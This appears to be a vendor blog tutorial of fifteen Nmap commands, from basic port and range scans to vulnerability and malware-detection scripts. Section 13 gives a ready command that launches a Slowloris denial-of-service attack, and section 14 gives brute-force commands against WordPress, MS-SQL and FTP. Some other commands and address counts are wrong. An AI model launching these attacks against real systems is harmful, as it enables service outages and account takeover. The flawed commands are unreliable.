Best 15 Nmap command examples   
Let’s get to know a few useful command-line based scans that can be performed using Nmap.   
   
1. Basic Nmap Scan against IP or host   
   
nmap 1.1.1.1   
   
Now, if you want to scan a hostname, simply replace the IP for the host, as you see below:   
   
nmap cloudflare.com   
   
These kinds of basic scans are perfect for your first steps when starting with Nmap.   
   
2. Scan specific ports or scan entire port ranges on a local or remote server   
   
nmap -p 1-65535 localhost   
   
In this example, we scanned all 65535 ports for our localhost computer.   
   
Nmap is able to scan all possible ports, but you can also scan specific ports, which will report faster results. See below:   
   
nmap -p 80,443 8.8.8.8   
   
3. Scan multiple IP addresses   
   
Let’s try to scan multiple IP addresses. For this you need to use this syntax:   
   
nmap 1.1.1.1 8.8.8.8   
   
You can also scan consecutive IP addresses:   
   
nmap -p 1.1.1.1,2,3,4   
   
This will scan 1.1.1.1, 1.1.1.2, 1.1.1.3 and 1.1.1.4.   
   
4. Scan IP ranges   
   
You can also use Nmap to scan entire CIDR IP ranges, for example:   
   
nmap -p 8.8.8.0/28   
   
This will scan 14 consecutive IP ranges, from 8.8.8.1 to 8.8.8.14.   
   
An alternative is to simply use this kind of range:   
   
nmap 8.8.8.1-14   
   
You can even use wildcards to scan the entire C class IP range, for example:   
   
nmap8.8.8.*   
   
This will scan 256 IP addresses from 8.8.8.1 to 8.8.8.256.   
   
If you ever need to exclude certain IPs from the IP range scan, you can use the “–exclude” option, as you see below:   
   
nmap -p 8.8.8.* --exclude8.8.8.1   
   
5. Scan the most popular ports   
   
Using “–top-ports” parameter along with a specific number lets you scan the top X most common ports for that host, as we can see:   
   
nmap --top-ports 20 192.168.1.106   
   
Replace “20” with the desired number. Output example:   
   
[root@securitytrails:~]nmap --top-ports 20 localhost   
Starting Nmap 6.40 ( http://nmap.org ) at 2018-10-01 10:02 EDT   
Nmap scan report for localhost (127.0.0.1)   
Host is up (0.000016s latency).   
Other addresses for localhost (not scanned): 127.0.0.1   
PORT   STATE    SERVICE   
21/tcp closed   ftp   
22/tcp closed   ssh   
23/tcp closed   telnet   
25/tcp closed   smtp   
53/tcp closed   domain   
80/tcp filtered http   
110/tcpclosed   pop3   
111/tcpclosed   rpcbind   
135/tcpclosed   msrpc   
139/tcpclosed   netbios-ssn   
143/tcpclosed   imap   
443/tcpfiltered https   
445/tcpclosed   microsoft-ds   
993/tcpclosed   imaps   
995/tcpclosed   pop3s   
1723/tcp closed pptp   
3306/tcp closed mysql   
3389/tcp closed ms-wbt-server   
5900/tcp closed vnc   
8080/tcp closed http-proxy   
   
6. Scan hosts and IP addresses reading from a text file   
   
In this case, Nmap is also useful to read files that contain hosts and IPs inside.   
   
Let’s suppose you create a list.txt file that contains these lines inside:   
   
192.168.1.106   
cloudflare.com   
microsoft.com   
securitytrails.com   
   
The “-iL” parameter lets you read from that file, and scan all those hosts for you:   
   
nmap -iL list.txt   
   
7. Save your Nmap scan results to a file   
   
On the other hand, in the following example we will not be reading from a file, but exporting/saving our results into a text file:   
   
nmap -oN output.txt securitytrails.com   
   
Nmap has the ability to export files into XML format as well, see the next example:   
   
nmap -oX output.xml securitytrails.com   
   
8. Disabling DNS name resolution   
   
If you need to speed up your scans a little bit, you can always choose to disable reverse DNS   
resolution for all your scans. Just add the “-n” parameter.   
   
[root@securitytrails:~]nmap -p 80 -n 8.8.8.8   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:15 -03   
Nmap scan report for 8.8.8.8   
Host is up (0.014s latency).   
PORT STATE    SERVICE   
80/tcp filtered http   
   
See the difference with a normal DNS-resolution enabled scan:   
   
[root@securitytrails:~]nmap -p 80 8.8.8.8   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:15 -03   
Nmap scan report for google-public-dns-a.google.com (8.8.8.8)   
Host is up (0.014s latency).   
PORT STATE    SERVICE   
80/tcp filtered http   
   
9. Scan + OS and service detection with fast execution   
   
Using the “-A” parameter enables you to perform OS and service detection, and at the same time we are combining this with “-T4” for faster execution. See the example below:   
   
nmap -A -T4 cloudflare.com   
   
This is the output we got for this test:   
nmap scan command example for os and service detection   
   
10. Detect service/daemon versions   
   
This can be done by using -sV parameters   
   
nmap -sV localhost   
   
As you can see here:   
   
[root@securitytrails:~]nmap -sV localhost   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:28 -03   
Nmap scan report for localhost (127.0.0.1)   
Host is up (0.000020s latency).   
Other addresses for localhost (not scanned): ::1   
Not shown: 997 closed ports   
PORT STATE SERVICE VERSION   
111/tcp open rpcbind 2-4 (RPC #100000)   
631/tcp open ipp CUPS 2.2   
902/tcp open ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)   
   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   
Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds   
   
11. Scan using TCP or UDP protocols   
   
One of the things we love most about Nmap is the fact that it works for both TCP and UDP protocols. And while most services run on TCP, you can also get a great advantage by scanning UDP-based services. Let’s see some examples.   
   
Standard TCP scanning output:   
   
[root@securitytrails:~]nmap -sT 192.168.1.1   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:33 -03   
Nmap scan report for 192.168.1.1   
Host is up (0.58s latency).   
Not shown: 995 closed ports   
PORT STATE SERVICE   
80/tcp open http   
1900/tcp open upnp   
20005/tcp open btx   
49152/tcp open unknown   
49153/tcp open unknown   
Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds   
   
UDP scanning results using “-sU” parameter:   
   
[root@securitytrails:~]nmap -sU localhost   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:37 -03   
Nmap scan report for localhost (127.0.0.1)   
Host is up (0.000021s latency).   
Other addresses for localhost (not scanned): ::1   
Not shown: 997 closed ports   
PORT STATE SERVICE   
68/udp open|filtered dhcpc   
111/udp open rpcbind   
5353/udp open|filtered zeroconf   
   
12. Vulnerability detection using Nmap   
   
One of Nmap’s greatest features that not all the network and systems administrators know about is something called “Nmap Scripting Engine” (known as NSE). This scripting engine allows users to use a pre-defined set of scripts, or write their own using Lua programming language.   
   
Using NSE is crucial in order to automate system and vulnerability scans. For example, if you want to run a full vulnerability test against your target, you can use these parameters:   
   
nmap -Pn --script vuln 192.168.1.105   
   
Output example:   
   
[root@securitytrails:~]nmap -Pn --script vuln 192.168.1.105   
Starting Nmap 7.60 ( https://nmap.org ) at 2018-10-01 09:46 -03   
Pre-scan script results:   
| broadcast-avahi-dos:   
| Discovered hosts:   
| 224.0.0.251   
| After NULL UDP avahi packet DoS (CVE-2011-1002).   
|_ Hosts are all up (not vulnerable).   
Nmap scan report for 192.168.1.105   
Host is up (0.00032s latency).   
Not shown: 995 closed ports   
PORT STATE SERVICE   
80/tcp open http   
|_http-csrf: Couldn't find any CSRF vulnerabilities.   
|_http-dombased-xss: Couldn't find any DOM based XSS.   
| http-slowloris-check:   
| VULNERABLE:   
| Slowloris DOS attack   
| State: LIKELY VULNERABLE   
| IDs: CVE:CVE-2007-6750   
| Slowloris tries to keep many connections to the target web server open and hold   
| them open as long as possible. It accomplishes this by opening connections to   
| the target web server and sending a partial request. By doing so, it starves   
| the http server's resources causing Denial Of Service.   
|   
| Disclosure date: 2009-09-17   
| References:   
| http://ha.ckers.org/slowloris/   
|_ https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750   
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.   
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)   
1900/tcp open upnp   
20005/tcp open btx   
49152/tcp open unknown   
49153/tcp open unknown   
   
As you can see, in this vulnerability test we were able to detect one CVE (Slowloris DOS attack).   
   
13. Launching DOS with Nmap   
   
Nmap features never seem to end, and thanks to the NSE, that even allows us to launch DOS attacks against our network testings.   
   
In our previous example (#12) we found the host was vulnerable to Slowloris attack, and now we’ll try to exploit that vulnerability by launching a DOS attack in a forever loop:   
   
nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true   
   
14. Launching brute force attacks   
   
NSE is really fascinating – it contains scripts for everything you can imagine. See the next three examples of BFA against WordPress, MSSQL, and FTP server:   
   
WordPress brute force attack:   
   
nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105   
   
Brute force attack against MS-SQL:   
   
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105   
   
FTP brute force attack:   
   
nmap --script ftp-brute -p 21 192.168.1.105   
   
15. Detecting malware infections on remote hosts   
   
Nmap is able to detect malware and backdoors by running extensive tests on a few popular OS services like on Identd, Proftpd, Vsftpd, IRC, SMB, and SMTP. It also has a module to check for popular malware signs inside remote servers and integrates Google’s Safe Browsing and VirusTotal databases as well.   
   
A common malware scan can be performed by using:   
   
nmap -sV --script=http-malware-host 192.168.1.105   
   
Or using Google’s Malware check:   
   
nmap -p80 --script http-google-malware infectedsite.com   
   
Output example:   
   
80/tcp openhttp   
|_http-google-malware.nse: Host is known for distributing malware.   
   
Nmap is one of the most complete and accurate port scanners used by infosec professionals today.   
With it, you can perform simple port scan tasks or use its powerful scripting engine to    
launch DOS attacks, detect malware or brute force testings on remote and local servers.   
   
Today we covered the top fifteen Nmap commands to scan remote hosts, but there’s a lot more   
to discover if you’re starting to use Nmap in your OSINT strategy.   
   
If you also need to map domains, IPs and discover DNS zones, try our SecurityTrails toolkit,   
 or grab a free API account today.   
